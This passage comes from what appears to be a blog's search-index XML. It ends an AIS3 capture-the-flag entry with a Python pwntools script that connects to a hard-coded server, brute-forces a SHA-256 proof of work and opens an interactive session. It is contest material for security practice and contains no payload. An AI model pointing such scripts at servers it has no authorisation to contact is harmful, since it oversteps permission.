class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'104.199.235.135'</span>, <span class="number">20000</span>)</span><br><span class="line">r.recvuntil(<span class="string">"condition : x[:6] == '"</span>)</span><br><span class="line">cond = r.recvuntil(<span class="string">"'"</span>).decode(<span class="string">'ascii'</span>).rstrip(<span class="string">"'"</span>)</span><br><span class="line">r.recvuntil(<span class="string">'x = '</span>)</span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line">alphanumeric = string.ascii_uppercase + string.ascii_lowercase + string.digits</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> itertools.product(alphanumeric, repeat=<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> sha256((<span class="string">'%s%s'</span>%(cond, <span class="string">''</span>.join(s))).encode(<span class="string">'utf-8'</span>)).hexdigest().startswith(<span class="string">'000000'</span>):</span><br><span class="line">        ans = cond + <span class="string">''</span>.join(s)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">r.sendline(ans)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>AIS3</tag>
        <tag>CTF</tag>
        <tag>Security</tag>
      </tags>
  </entry>
</search>
